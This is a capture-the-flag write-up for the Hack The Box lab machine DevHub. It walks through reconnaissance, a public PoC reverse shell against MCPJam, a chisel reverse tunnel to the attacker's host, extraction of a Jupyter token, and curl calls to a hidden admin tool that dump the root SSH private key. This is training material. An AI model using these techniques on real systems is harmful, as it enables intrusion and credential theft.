# DevHub — Hack The Box Writeup

<img width="887" height="248" alt="image" src="https://github.com/user-attachments/assets/910a36a3-ad44-4ecb-9cf2-a1512e95326b" />

**I had to restart the machine a couple of times, so the machine's IP changed a couple of times.**
## Reconnaissance

### Port Scanning
```bash
 nmap -sV -p- 10.129.4.23 > nmap.txt
```
<img width="830" height="745" alt="image" src="https://github.com/user-attachments/assets/dc62ebf1-739b-4537-9de2-c462d52fc406" />

Open ports: 22 (SSH), 80 (HTTP), 6274 (HTTP)

### Web Enumeration

I Initially checked port 80, but did not find much.

port 6274, however, was much more interesting:

Here is it hosting MCPJam v1.4.2 which is known to be vulnerable to remote execution.

<img width="522" height="263" alt="image" src="https://github.com/user-attachments/assets/eebc014e-eebd-4912-a97a-a0a1ffc41d6e" />

---

## Initial Access - CVE-2026-23744

### Reverse Shell
There are serveral PoCs published on github. I used -> https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC

With this exploit.py script I was able to directly run it and obtained a reverse shell as `mcp-dev`

<img width="545" height="215" alt="image" src="https://github.com/user-attachments/assets/8bfa4741-b7a0-4f3b-acd9-903be5c61515" />


## Lateral Movement

### Discovering the Jupyter Server

Confirmed a Jupyter server running on `localhost:8888`:
```bash
curl -v http://localhost:8888
```

The server responded with a `302 Found` redirect to `/lab`, served by `TornadoServer/6.5.4`, confirming a JupyterLab instance.

<img width="732" height="326" alt="image" src="https://github.com/user-attachments/assets/5be17637-0e72-4091-9b0e-f9513f629a6e" />

### Extracting the Jupyter Token

The Jupyter process was visible in the process list with the token exposed in the command-line arguments:
```bash
ps aux | grep jupyter
```
```
analyst  1060  ...  /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab \
  --ip=127.0.0.1 --port=8888 --no-browser \
  --notebook-dir=/home/analyst/notebooks \
  --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

### Port Forwarding with Chisel

Downloaded chisel from GitHub and set up a reverse tunnel to access Jupyter from the attack machine's browser.

**Attack machine (server):**
```bash
./chisel server -p 8080 --reverse
```

**Target (client):**
```bash
./chisel client 10.10.15.206:8080 R:8888:127.0.0.1:8888 &
```
<img width="519" height="134" alt="image" src="https://github.com/user-attachments/assets/22c26ede-9e77-4f15-84b6-f7014465278a" />

<img width="706" height="132" alt="image" src="https://github.com/user-attachments/assets/3a302446-5e1e-4a13-9b96-9dcd2d3fe6d3" />


Accessed JupyterLab in the browser at:
```
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```
<img width="926" height="849" alt="image" src="https://github.com/user-attachments/assets/23c73a76-3311-4e10-914a-87a21ad24b65" />

---

## User Flag

Obtained a shell as `analyst` through the Jupyter terminal interface.

```bash
cat ~/user.txt
```

---

## Privilege Escalation

### Enumeration

Process enumeration revealed a Python server running as **root**:
I uploaded linpeas.sh and found 
```
root  1072  ...  /home/manalyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```
<img width="1285" height="442" alt="image" src="https://github.com/user-attachments/assets/e456994f-7d95-4549-b36f-edea850cba86" />

### Rabbit Hole — PwnKit (CVE-2021-4034)

`pkexec` had the SUID bit set and reported version `0.105`, which falls within the affected range for CVE-2021-4034. However, the PoC failed:
```bash
./cve-2021-4034-poc
GLib: Cannot convert message: Could not open converter from "UTF-8" to "PWNKIT"
```

Checking the package version confirmed the vulnerability had been **backported**:
```bash
apt-cache policy policykit-1
```
```
Installed: 0.105-33ubuntu0.1
```

The `ubuntu0.1` suffix and the `jammy-security` source confirmed the patch was applied. This was a deliberate rabbit hole placed by the box author.

### Finding the OPSMCP Server

Identified the server's listening port by reading `/proc/net/tcp` and converting from hex:
```
0100007F:1388 → 127.0.0.1:5000 (uid 0)
```

Confirmed the server was operational:
```bash
curl http://127.0.0.1:5000
```
```json
{"server":"OPSMCP","version":"2.1.0","status":"operational",
 "endpoints":["/tools/list","/tools/call","/health"],
 "auth":"Required - X-API-Key header"}
```

### Extracting the API Key

Reading the server source code revealed the API key and hidden tools:
```bash
cat /opt/opsmcp/server.py
```

API key: `opsmcp_secret_key_4f5a6b7c8d9e0f1a`

The code contained two hidden tools not listed in `/tools/list`:
- `ops._admin_dump` — Emergency credential dump
- `ops._debug_mode` — Enable debug mode

### Dumping Root SSH Key

Called the hidden `ops._admin_dump` tool with `target=ssh_keys` to dump the root private key:
```bash
curl -X POST \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
  http://127.0.0.1:5000/tools/call
```

The server returned the root SSH private key. Saved it to a file and set permissions:
```bash
curl -s -X POST \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
  http://127.0.0.1:5000/tools/call \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['root_private_key'])" > root_key
chmod 600 root_key
```
<img width="869" height="338" alt="image" src="https://github.com/user-attachments/assets/2b2722cc-16ea-4e8e-96a0-e05452b1faa1" />


### Root Shell

```bash
ssh -i root_key root@10.129.48.251
```

```bash
cat /root/root.txt
```

---

## Summary

| Step | Detail |
|------|--------|
| Foothold | Reverse shell via MCP Inspector as `mcp-dev` |
| Lateral Movement | Jupyter token extracted from process listing |
| User | Shell as `analyst` via JupyterLab terminal |
| Rabbit Hole | CVE-2021-4034 (PwnKit) — patched via backport |
| Privesc | Hidden `ops._admin_dump` tool in OPSMCP server running as root |
| Root | SSH as root using dumped private key |

---
